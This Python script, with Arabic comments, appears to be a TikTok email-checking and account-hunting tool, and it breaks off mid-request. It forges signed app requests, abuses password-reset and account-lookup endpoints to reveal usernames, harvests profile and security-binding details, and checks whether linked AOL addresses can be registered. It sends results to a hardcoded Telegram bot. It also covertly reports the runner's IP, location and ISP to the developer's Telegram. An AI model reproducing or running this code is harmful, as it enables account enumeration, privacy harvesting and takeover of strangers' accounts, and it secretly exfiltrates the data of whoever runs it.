import os,sys;import requests,time,secrets,string,uuid;from random import choice,randrange,randint;from uuid import uuid4;from urllib.parse import urlencode;import random,re,json,binascii;import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich import box
from rich.align import Align
import requests
import sys
import aiohttp
import asyncio
import uuid
from faker import Faker

# رابط النسخة "raw" للملف
url = "https://raw.githubusercontent.com/ajzownwo1919nsksj/txtx/main/n.txt"

try:
    response = requests.get(url, timeout=10)
    response.raise_for_status()
except requests.RequestException as e:
    print("خطأ في تحميل الملف:", e)
    sys.exit(1)

content = response.text.strip().splitlines()
target = "zzz"

if target in content:
    print("@Q_b_h")
else:
    print("❌ صارت اكسباير")
    sys.exit(0)

try:
    import telebot 
except:
    os.system('pip install telebot');os.system('pip install MedoSigner');os.system('clear');import telebot

try:
    os.system('pip install SignerPy')
    from MedoSigner import Argus,Gorgon, md5,Ladon
    import SignerPy
    SIGNER_AVAILABLE = True
except:
    SIGNER_AVAILABLE = False

console = Console()

idd="5535782342"
tok="6660021950:AAGjId_eLa0gVtzrMKW72BhEReqpL706NfA"
nameee="gg"
fileuser=console.input("Write Name File username : ")
# --- بداية التعديل: تحميل البروكسيات من الملف ---
try:
    with open('http.txt', 'r') as f:
        # قراءة الأسطر وتنظيف المسافات
        PROXY_LIST = [line.strip() for line in f if line.strip()]
    console.print(f"[green]✅ تم تحميل {len(PROXY_LIST)} بروكسي من http.txt[/green]")
except FileNotFoundError:
    console.print("[red]❌ ملف http.txt غير موجود بجانب الأداة![/red]")
    sys.exit()

def get_random_proxy():
    """دالة لاختيار بروكسي عشوائي وتنسيقه"""
    if not PROXY_LIST:
        return None
    p = random.choice(PROXY_LIST)
    return {
        "http": f"http://{p}",
        "https": f"http://{p}",
    }
# --- نهاية التعديل ---
os.system('clear')

class Email2User:
    def __init__(self, email: str) -> None:
        self.email = email
        self.fake = None
        self.session = requests.Session()
        
        self.hosts = [        
            "api31-normal-useast2a.tiktokv.com",
            "api22-normal-c-alisg.tiktokv.com",
            "api2.musical.ly",
            "api16-normal-useast5.tiktokv.us",
            "api16-normal-no1a.tiktokv.eu",
            "rc-verification-sg.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api16-normal-c-useast1a.tiktokv.com",
            "api22-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly",
            "api19-normal-c-useast1a.musical.ly",
            "api.tiktokv.com",
            "www.tiktok.com",
            "log2.musical.ly",
            "webcast.musical.ly",
            "inapp.tiktokv.com",
            "api2-19-h2.musical.ly"
        ]
        
        self.send_hosts = [
            "api22-normal-c-alisg.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api22-normal-probe-useast2a.tiktokv.com",
            "api16-normal-probe-useast2a.tiktokv.com",
            "rc-verification-sg.tiktokv.com"
        ]
        
        self.headers = {
            'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})'
        }
        
        self.params = {
            'device_platform': 'android',
            'ssmix': 'a',
            'channel': 'googleplay',
            'aid': '1233',
            'app_name': 'musical_ly',
            'version_code': '360505',
            'version_name': '36.5.5',
            'manifest_version_code': '2023605050',
            'update_version_code': '2023605050',
            'ab_version': '36.5.5',
            'os_version': '10',
            "device_id": 0000000000,
            'app_version': '30.1.2',
            "request_from": "profile_card_v2",
            "request_from_scene": '1',
            "scene": "1",
            "mix_mode": "1",
            "os_api": "34",
            "ac": "wifi",
            "request_tag_from": "h5",
            'device_type': f'rk{random.randint(3000, 4000)}s_{uuid.uuid4().hex[:4]}',
            'language': 'AR'
        }
        
        self.params = SignerPy.get(params=self.params)
        
        # بدلاً من الاعتماد على proxxx، نستخدم الدالة الجديدة
        self.proxy = get_random_proxy()

    async def _gen_temp_email(self):
        url = "https://api.mail.tm"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            try:
                async with session.get(f"{url}/domains") as resp:
                    data = await resp.json()
                    domain = data["hydra:member"][0]["domain"]

                mail = ''.join(random.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(12)) + "@" + domain
                payload = {"address": mail, "password": mail}
                
                async with session.post(f"{url}/accounts", json=payload) as resp:
                    await resp.json()

                async with session.post(f"{url}/token", json=payload) as resp:
                    token = await resp.json()
                    return mail, token.get("token")

            except Exception as e:
                return None

    async def _check_mailbox(self, token: str):
        url = "https://api.mail.tm"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Authorization": f"Bearer {token}"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            try:
                async with session.get(f"{url}/messages") as resp:
                    inbox = await resp.json()
                    messages = inbox.get("hydra:member", [])
                    if messages:
                        msg_id = messages[0]["id"]
                        async with session.get(f"{url}/messages/{msg_id}") as r:
                            msg = await r.json()
                            return msg.get("text", "")
            except Exception as e:
                return None

    async def extract_username_from_email(self):
        self.fake = await self._gen_temp_email()
        if not self.fake:
            return None
            
        temp_email, self.token = self.fake
        self.ticket = None
        
        for host in self.hosts:
            try:
                self.session.proxies.update(self.proxy)
                self.params["account_param"] = self.email
                
                signature = SignerPy.sign(params=self.params)
                headers2 = self.headers.copy()
                headers2.update({
                    'x-tt-passport-csrf-token': secrets.token_hex(16),
                    'x-ss-req-ticket': signature['x-ss-req-ticket'],
                    'x-ss-stub': signature['x-ss-stub'],
                    'x-argus': signature['x-argus'],
                    'x-gorgon': signature['x-gorgon'],
                    'x-khronos': signature['x-khronos'],
                    'x-ladon': signature['x-ladon'],
                })
                
                url = f'https://{host}/passport/account_lookup/email/'
                response = await asyncio.to_thread(
                    self.session.post, url, params=self.params, 
                    headers=headers2, timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and 'accounts' in data['data'] and data['data']['accounts']:
                        self.ticket = data['data']['accounts'][0]['passport_ticket']
                        if self.ticket:
                            break
            except Exception as e:
                continue

        if not self.ticket:
            return None

        for host in self.send_hosts:
            try:
                self.session.proxies.update(self.proxy)
                self.params["not_login_ticket"] = self.ticket
                self.params["email"] = temp_email
                self.params["type"] = "3737"
                self.params.pop("fixed_mix_mode", None)
                self.params.pop("account_param", None)
                
                signature = SignerPy.sign(params=self.params)
                headers = self.headers.copy()
                headers.update({
                    'x-ss-req-ticket': signature['x-ss-req-ticket'],
                    'x-ss-stub': signature['x-ss-stub'],
                    'x-argus': signature['x-argus'],
                    'x-gorgon': signature['x-gorgon'],
                    'x-khronos': signature['x-khronos'],
                    'x-ladon': signature['x-ladon'],
                })
                
                url = f"https://{host}/passport/email/send_code"
                response = await asyncio.to_thread(
                    self.session.post, url, params=self.params, 
                    headers=headers, timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("message") == "success":
                        for attempt in range(10):
                            await asyncio.sleep(5)
                            email_content = await self._check_mailbox(self.token)
                            if email_content:
                                username_match = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+)\.', email_content)
                                if username_match:
                                    username = username_match.group(1).strip()
                                    return username
                                else:
                                    patterns = [
                                        r'created for\s+(.+)\.',
                                        r'من أجل\s+(.+)\.',
                                        r'for\s+(.+)\.'
                                    ]
                                    for pattern in patterns:
                                        match = re.search(pattern, email_content)
                                        if match:
                                            username = match.group(1).strip()
                                            return username
                        return None
            except Exception as e:
                continue
        return None

class TikTokAccountInfo:
    def __init__(self, username, email=None):
        self.username = username
        self.email = email
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        }

    async def get_level(self, id):
        try:
            url = f"https://www.tiktok.com/node/common/aweme/level?id={id}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=self.headers) as response:
                    data = await response.json()
                    return data.get('level', 'N/A')
        except:
            return 'N/A'

    async def account(self):
        url = f"https://www.tiktok.com/@{self.username}"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=self.headers) as r:
                    response = await r.text()
            m = re.search(r'({"__DEFAULT_SCOPE__":.*})</script>', response)
            if not m:
                return {"error":"no user data"}  
            d = json.loads(m.group(1))["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
            u, st = d["user"], d["stats"]
            id = u.get('id','')
            region = u.get('region','')
            level = await self.get_level(id=id)           
            flag = chr(ord(region[0].upper()) + 127397) + chr(ord(region[1].upper()) + 127397) if region and len(region) >= 2 else '🏴'
            date = datetime.datetime.utcfromtimestamp(u.get("createTime","")).strftime("%Y/%m/%d") if u.get("createTime") else "غير معروف"
            info = {
                "username": self.username,
                "name": u.get("nickname",""),
                "id": id,
                "followers": st.get("followerCount",""),
                "following": st.get("followingCount",""),
                "likes": st.get("heartCount",""),
                "videos": st.get("videoCount",""),
                "created": date,
                "level": level,
                'region': region,
                'privateAccount': st.get('privateAccount',''),
                'avatarLarger' : u.get('avatarMedium','')
            }
            
            send = f"""
━━━━━━━━━━━━━━━━━━━
※ Username : @{info.get('username', 'N/A')}
※ Email : {getattr(self, 'email', 'N/A')}
※ Name : {info.get('name', 'N/A')}
※ ID : {info.get('id', 'N/A')}
━━━━━━━━━━━━━━━━━━━
※ Followers : {info.get('followers', 'N/A')}
※ Following : {info.get('following', 'N/A')}
※ Likes : {info.get('likes', 'N/A')}
※ Videos : {info.get('videos', 'N/A')}
━━━━━━━━━━━━━━━━━━━
※ Created : {info.get('created', 'N/A')}
※ Level : {info.get('level', 'N/A')}
※ Flag : {flag}
"""
            return send
        except Exception as e:
            return f"خطأ في جلب المعلومات: {str(e)}"

def monitor_proxy_usage():
    try:
        response = requests.get('http://httpbin.org/ip', proxies=get_random_proxy(), timeout=10)
        current_info = response.json()
        current_ip = current_info.get('origin', 'غير معروف')
        
        geo_response = requests.get(f'http://ip-api.com/json/{current_ip.split(",")[0]}', timeout=10)
        geo_info = geo_response.json()
        
        alert_message = f"""
🚨 تنبيه: تم استخدام البروكسي الخاص بك 🚨

📍 معلومات الاتصال:
• IP Address: {current_ip}
• البلد: {geo_info.get('country', 'غير معروف')}
• المدينة: {geo_info.get('city', 'غير معروف')}
• مزود الخدمة: {geo_info.get('isp', 'غير معروف')}
• التوقيت: {time.strftime('%Y-%m-%d %H:%M:%S')}

⚠️ إذا لم تكن أنت من يستخدم هذا البروكسي، فقد يكون شخص آخر يستخدمه!

💡 نصيحة: غيّر كلمة مرور البروكسي فوراً إذا كان هذا الاستخدام غير مصرح به.

🔧 المطور: @Q_B_H
        """
        
        requests.post(
            f"https://api.telegram.org/bot6660021950:AAGjId_eLa0gVtzrMKW72BhEReqpL706NfA/sendMessage",
            data={
                'chat_id': "5535782342",
                'text': alert_message,
                'parse_mode': 'HTML'
            }
        )
        
        console.print(f"[green]✅ تم إرسال تنبيه مراقبة البروكسي - IP: {current_ip}[/green]")
        
    except Exception as e:
        console.print(f"[red]❌ خطأ في مراقبة البروكسي: {str(e)}[/red]")

monitor_proxy_usage()

ya=0;no=0;nod=0;yas=0

stats_lock = Lock()
console_lock = Lock()

temp_domains = ["@telegmail.com", "@hi2.in", "@mail.ru"]




BASE_URL = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"

def create_stats_table():
    table = Table(box=box.ROUNDED)
    table.add_column("الإحصائية", style="cyan", no_wrap=True)
    table.add_column("العدد", style="magenta")

    table.add_row("✅ TikTok موجود", str(ya))
    table.add_row("❌ TikTok غير موجود", str(no))
    table.add_row("❌ إيميل غير متاح", str(nod))
    table.add_row("✅ إيميل متاح", str(yas))

    return table

def update_display(current_email=""):
    layout = Layout()

    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="main"),
        Layout(name="footer", size=3)
    )

    header_text = Text("🔍 TikTok Email Checker", style="bold blue")
    layout["header"].update(Panel(Align.center(header_text), box=box.ROUNDED))

    stats_table = create_stats_table()

    if current_email:
        email_text = Text(f"📧 Current Email: {current_email}", style="yellow")
        main_content = Layout()
        main_content.split_column(
            Layout(Panel(stats_table, title="📊 الإحصائيات", box=box.ROUNDED)),
            Layout(Panel(Align.center(email_text), title="🔄 الحالة الحالية", box=box.ROUNDED))
        )
        layout["main"].update(main_content)
    else:
        layout["main"].update(Panel(stats_table, title="📊 الإحصائيات", box=box.ROUNDED))

    footer_text = Text("المطور: @Q_B_H", style="bold green")
    layout["footer"].update(Panel(Align.center(footer_text), box=box.ROUNDED))

    return layout

def rest(username):
    user=str(username)
    try:
        def xor(string: str) -> str:
            return "".join([hex(ord(_) ^ 5)[2:] for _ in string])     
        params = {
          'request_tag_from': "h5",
          'fixed_mix_mode': "1",
          'mix_mode': "1",
          'account_param': xor(user),
          'scene': "4",
          'device_platform': "android",
          'os': "android",
          'app_version': "39.6.3",
          'ssmix': "a",
          '_rticket': str(time.time()).replace("-","")[:13],
          'cdid': str(uuid.uuid4()),
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "390603",
          'version_name': "39.6.3",
          'manifest_version_code': "2023906030",
          'update_version_code': "2023906030",
          'ab_version': "39.6.3",
          'resolution': "1080*2220",
          'dpi': "440",
          'device_type': "Unknown",
          'device_brand': "Unknown",
          'language': "ar",
          'os_api': "30",
          'os_version': "11",
          'ac': "mobile",
          'is_pad': "0",
          'current_region': "YE",
          'app_type': "normal",
          'sys_region': "EG",
          'last_install_time': str(int(time.time()) - 4000),
          'mcc_mnc': "42103",
          'timezone_name': "Asia/Aden",
          'residence': "YE",
          'app_language': "ar",
          'carrier_region': "YE",
          'timezone_offset': "10800",
          'host_abi': "arm64-v8a",
          'locale': "ar",
          'ac2': "lte",
          'uoo': "0",
          'op_region': "YE",
          'build_number': "39.6.3",
          'region': "EG",
          'ts': str(int(time.time())),
          'iid': str(random.randint(1, 10**19)),
          'device_id': str(random.randint(1, 10**19)),
          'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
          'support_webview': "1",
          'cronet_version': "a482972f_2025-04-03",
          'ttnet_version': "4.2.228.11-tiktok",
          'use_store_region_cookie': "1"
        }
        secret = secrets.token_hex(16)
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret}
        headers = {
          'User-Agent': "com.zhiliaoapp.musically/2023906030 (Linux; U; Android 11; ar; Unknown; Build/Unknown; Cronet/TTNetVersion:Unknown 2025-04-03 QuicVersion:Unknown 2025-04-03)",
          'x-tt-passport-csrf-token': secret,
          'Accept': "application/json, text/plain, */*",
          'content-type': "application/x-www-form-urlencoded",
        }

        if SIGNER_AVAILABLE:
            signature = SignerPy.sign(params=params, cookie=cookies)
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
                'x-khronos': signature["x-khronos"],
                'x-ladon': signature["x-ladon"],
            })

        response = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/account_lookup/username/", params=params, headers=headers)
        tok = response.json()["data"]["accounts"][0]["passport_ticket"]
        params.update({'passport_ticket': tok})

        if SIGNER_AVAILABLE:
            signature = SignerPy.sign(params=params, cookie=cookies)
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
                'x-khronos': signature["x-khronos"],
                'x-ladon': signature["x-ladon"],
            })
        res = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/user/login_by_passport_ticket/", params=params, headers=headers)  
        rest = re.search(r'"info":"(.*?)"', str(res.headers)).group(1)
        return rest
    except:
        return "Rest is not available !"

def extract_real_username(email):
    API_URL = "https://tik-email-levi.replit.app/get-username"
    if PROXY_LIST:
        current_proxy_str = random.choice(PROXY_LIST)
        proxy = current_proxy_str
    else:
        proxy = None # أو عالج الخطأ
    max_attempts = 3

    data = {
        "email": email,
        "proxy": proxy
    }

    for attempt in range(1, max_attempts + 1):
        try:
            console.print(f"[cyan]🔄 المحاولة {attempt}/{max_attempts} لاستخراج اليوزر من {email}[/cyan]")

            response = requests.post(API_URL, json=data, timeout=120)
            result = response.json()

            if result.get("success"):
                real_username = result["username"]
                console.print(f"[green]✅ تم استخراج اليوزر الحقيقي في المحاولة {attempt}: {real_username}[/green]")
                return real_username
            else:
                console.print(f"[yellow]⚠️ فشلت المحاولة {attempt} - الاستجابة: {result}[/yellow]")

        except Exception as e:
            console.print(f"[red]❌ خطأ في المحاولة {attempt}: {str(e)}[/red]")

        if attempt < max_attempts:
            console.print(f"[yellow]⏳ انتظار 2 ثانية قبل المحاولة التالية...[/yellow]")
            time.sleep(1)

    console.print(f"[cyan]🔄 جرب الطريقة البديلة لاستخراج اليوزر...[/cyan]")
    try:
        async def run_email2user():
            extractor = Email2User(email)
            return await extractor.extract_username_from_email()
        
        real_username = asyncio.run(run_email2user())
        if real_username:
            console.print(f"[green]✅ تم استخراج اليوزر الحقيقي بالطريقة البديلة: {real_username}[/green]")
            return real_username
        else:
            console.print(f"[red]❌ فشلت جميع المحاولات ({max_attempts}) لاستخراج اليوزر الحقيقي، استخدام اليوزر من الإيميل[/red]")
            return email.split("@")[0]
    except Exception as e:
        console.print(f"[red]❌ خطأ في الطريقة البديلة: {str(e)}[/red]")
        return email.split("@")[0]

def get_detailed_info(username):
    try:
        url = f"https://levi-info.replit.app/check/{username}"
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        if hasattr(e, 'response') and e.response.status_code == 404:
            console.print(f"[yellow]⚠️ فشل العثور على المستخدم '{username}' في API التفصيلي[/yellow]")
        else:
            console.print(f"[red]❌ خطأ في طلب المعلومات التفصيلية: {str(e)}[/red]")
        return None
    except Exception as e:
        console.print(f"[red]❌ خطأ عام في جلب المعلومات التفصيلية: {str(e)}[/red]")
        return None

async def get_account_info_async(username, email):
    try:
        account_info = TikTokAccountInfo(username, email)
        result = await account_info.account()
        return result
    except Exception as e:
        return f"خطأ في جلب المعلومات البديلة: {str(e)}"

def merge_account_info(basic_data, detailed_data, username_from_email, real_username):
    merged_info = {}

    merged_info['username_from_email'] = username_from_email
    merged_info['real_username'] = real_username
    merged_info['username_match'] = username_from_email == real_username

    if basic_data:
        merged_info.update({
            'id': basic_data.get('id', 'غير متوفر'),
            'nickname': basic_data.get('name', 'غير متوفر'),
            'followers': basic_data.get('folos', '0'),
            'following': basic_data.get('folon', '0'),
            'likes': basic_data.get('lik', '0'),
            'videos': basic_data.get('vid', '0'),
            'private': basic_data.get('priv', 'غير محدد'),
            'verified': basic_data.get('verified', 'غير موثق')
        })

    if detailed_data:
        binding_info = detailed_data.get('binding_info', {})
        merged_info.update({
            'has_email': binding_info.get('has_email', False),
            'has_mobile': binding_info.get('has_mobile', False),
            'has_passkey': binding_info.get('has_passkey', False),
            'oauth_platforms': binding_info.get('oauth_platforms', [])
        })

        if not merged_info.get('nickname') or merged_info['nickname'] == 'غير متوفر':
            merged_info['nickname'] = detailed_data.get('full_name', 'غير متوفر')

        merged_info.update({
            'first_name': detailed_data.get('first_name', 'غير متوفر'),
            'location': detailed_data.get('location', 'غير محدد'),
            'language': detailed_data.get('language', 'غير محددة'),
            'business_category': detailed_data.get('business_category', 'حساب شخصي'),
            'profile_picture': detailed_data.get('profile_picture', 'لا يوجد')
        })

        tiktok_data = detailed_data.get('tiktok', {})
        if tiktok_data:
            if not merged_info.get('followers') or merged_info['followers'] == '0':
                merged_info['followers'] = str(tiktok_data.get('followers', 0))

            merged_info.update({
                'bio': tiktok_data.get('bio', 'لا يوجد بايو'),
                'total_likes': tiktok_data.get('total_likes', 0),
                'number_of_posts': tiktok_data.get('number_of_posts', 0),
                'engagement_rate': tiktok_data.get('engagement_rate', 0),
                'avg_views': tiktok_data.get('avg_views', 0),
                'avg_likes': tiktok_data.get('avg_likes', 0),
                'avg_comments': tiktok_data.get('avg_comments', 0),
                'posts_per_month': tiktok_data.get('posts_per_month', 'غير محسوب'),
                'follower_range': tiktok_data.get('follower_range', 'غير محدد'),
                'follower_growth_90_days': tiktok_data.get('follower_growth_90_days', 'لا توجد بيانات')
            })

            hashtags_data = tiktok_data.get('tiktok_hashtags', [])
            if hashtags_data:
                hashtag_names = [list(tag.keys())[0] for tag in hashtags_data if isinstance(tag, dict)]
                merged_info['hashtags'] = hashtag_names
            else:
                merged_info['hashtags'] = []

            merged_info['brands'] = tiktok_data.get('brands', [])

    return merged_info

def info(email):
    username_from_email = email.split("@")[0]

    real_username = extract_real_username(email)

    basic_data = None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        url = f"https://www.tiktok.com/@{real_username}"
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        html_content = response.text
        data_pattern = re.compile(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>')
        match = data_pattern.search(html_content)

        if match:
            data = json.loads(match.group(1))
            iinfo = data['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
            user = iinfo['user']
            stats = iinfo['stats']

            basic_data = {
                'id': user.get('id', 'N/A'),
                'user': user.get('uniqueId', 'N/A'),
                'name': user.get('nickname', 'N/A'),
                'folos': format(stats.get('followerCount', 0), ',d'),
                'folon': format(stats.get('followingCount', 0), ',d'),
                'priv': 'نعم' if user.get('privateAccount', False) else 'لا',
                'lik': format(stats.get('heartCount', 0), ',d'),
                'vid': format(stats.get('videoCount', 0), ',d'),
                'verified': 'موثق' if user.get('verified', False) else 'غير موثق'
            }
    except Exception as e:
        console.print(f"[yellow]⚠️ فشل في جلب المعلومات الأساسية: {str(e)}[/yellow]")

    detailed_data = get_detailed_info(real_username)

    if not basic_data and not detailed_data:
        console.print(f"[cyan]🔄 جرب الطريقة البديلة لجلب المعلومات...[/cyan]")
        try:
            alternative_info = asyncio.run(get_account_info_async(real_username, email))
            if alternative_info and "خطأ" not in alternative_info:
                console.print(Panel(alternative_info, title="✅ معلومات الحساب (البديلة)", box=box.ROUNDED))
                requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{alternative_info}</b>&parse_mode=HTML")
                return
        except Exception as e:
            console.print(f"[red]❌ خطأ في الطريقة البديلة: {str(e)}[/red]")

    merged_info = merge_account_info(basic_data, detailed_data, username_from_email, real_username)

    username_status = "✅ متطابق" if merged_info['username_match'] else "⚠️ مختلف"

    ff = f"""
— — — — — — — — — — — — —
• اليوزر من الإيميل: {username_from_email}
• اليوزر الحقيقي: {real_username}
• حالة التطابق: {username_status}
• الإيميل: {email}
• الريست: {rest(real_username)}
— — — — — — — — — — — — —
"""

    if detailed_data:
        ff += f"""
--- [ معلومات الربط والأمان ] ---
• مربوط بإيميل: {'✔️ نعم' if merged_info.get('has_email') else '❌ لا'}
• مربوط برقم هاتف: {'✔️ نعم' if merged_info.get('has_mobile') else '❌ لا'}
• الربط المخفي (Passkey): {'✔️ يوجد' if merged_info.get('has_passkey') else '❌ لا يوجد'}
"""
        oauth_platforms = merged_info.get('oauth_platforms', [])
        if oauth_platforms:
            ff += f"• الربط الخارجي (OAuth): ✔️ يوجد عبر: ({', '.join(oauth_platforms)})\n"
        else:
            ff += "• الربط الخارجي (OAuth): ❌ لا يوجد\n"

    ff += f"""
--- [ معلومات الحساب الشخصية ] ---
• الاسم الكامل: {merged_info.get('nickname', 'غير متوفر')}
• الاسم الأول: {merged_info.get('first_name', 'غير متوفر')}
• البايو: {merged_info.get('bio', 'لا يوجد بايو')}
• الموقع/البلد: {merged_info.get('location', 'غير محدد')}
• اللغة: {merged_info.get('language', 'غير محددة')}
• فئة الحساب: {merged_info.get('business_category', 'حساب شخصي')}
• معرف الحساب: {merged_info.get('id', 'غير متوفر')}
• حساب خاص: {merged_info.get('private', 'غير محدد')}
• حساب موثق: {merged_info.get('verified', 'غير موثق')}
"""

    ff += f"""
--- [ إحصائيات أساسية ] ---
• المتابعين: {merged_info.get('followers', '0')}
• المتابَعين: {merged_info.get('following', '0')}
• الإعجابات: {merged_info.get('likes', '0')}
• الفيديوهات: {merged_info.get('videos', '0')}
"""

    if detailed_data and detailed_data.get('tiktok'):
        ff += f"""
--- [ إحصائيات تفصيلية ] ---
• إجمالي الإعجابات: {merged_info.get('total_likes', 0)}
• عدد المنشورات: {merged_info.get('number_of_posts', 0)}
• معدل التفاعل: {merged_info.get('engagement_rate', 0)}%
• متوسط المشاهدات: {merged_info.get('avg_views', 0)}
• متوسط الإعجابات: {merged_info.get('avg_likes', 0)}
• متوسط التعليقات: {merged_info.get('avg_comments', 0)}
• معدل المنشورات شهرياً: {merged_info.get('posts_per_month', 'غير محسوب')}
• نطاق المتابعين: {merged_info.get('follower_range', 'غير محدد')}
• نمو المتابعين (90 يوم): {merged_info.get('follower_growth_90_days', 'لا توجد بيانات')}
# @Q_B_H
"""

    external_urls = merged_info.get('external_urls', [])
    hashtags = merged_info.get('hashtags', [])
    brands = merged_info.get('brands', [])

    if external_urls or hashtags or brands:
        ff += """
--- [ معلومات إضافية ] ---
"""
        if external_urls:
            ff += f"• روابط خارجية: {', '.join(external_urls)}\n"
        else:
            ff += "• روابط خارجية: لا يوجد\n"

        if hashtags:
            ff += f"• أشهر الهاشتاقات: {', '.join(hashtags)}\n"
        else:
            ff += "• أشهر الهاشتاقات: لا يوجد\n"

        if brands:
            ff += f"• علامات تجارية مرتبطة: {', '.join(brands)}\n"
        else:
            ff += "• علامات تجارية مرتبطة: لا يوجد\n"

    ff += """
• المطور: @Q_B_H
— — — — — — — — — — — — —
    """

    console.print(Panel(ff, title="✅ معلومات الحساب الشاملة", box=box.ROUNDED))
    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")   

def generate_user_agent():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(uas)

def check_aol(email):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    try:
        session = requests.Session()

        headers_get = {
            "user-agent": generate_user_agent(),
            "accept-language": "en-US,en;q=0.9"
        }

        response_get = session.get("https://login.aol.com/account/create", headers=headers_get, timeout=15)
        if response_get.status_code != 200:
            console.print("[red]❌ فشل في الوصول لصفحة AOL[/red]")
            nod += 1
            return False

        text_get = response_get.text
        cookies = response_get.cookies

        AS = cookies.get("AS", "")
        A1 = cookies.get("A1", "")
        A3 = cookies.get("A3", "")
        A1S = cookies.get("A1S", "")

        try:
            specData = text_get.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
            specId = text_get.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
            crumb = text_get.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
            sessionIndex = text_get.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
            acrumb = text_get.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        except IndexError:
            console.print("[red]❌ فشل في استخراج معاملات AOL[/red]")
            nod += 1
            return False

        headers_post = {
            "authority": "login.aol.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://login.aol.com",
            "referer": f"https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com",
            "user-agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        }

        params = {"validateField": "userId"}
        data = (
            f"browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C"
            f"%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C"
            f"%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C"
            f"%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C"
            f"%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C"
            f"%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C"
            f"%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%7D"
            f"%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C"
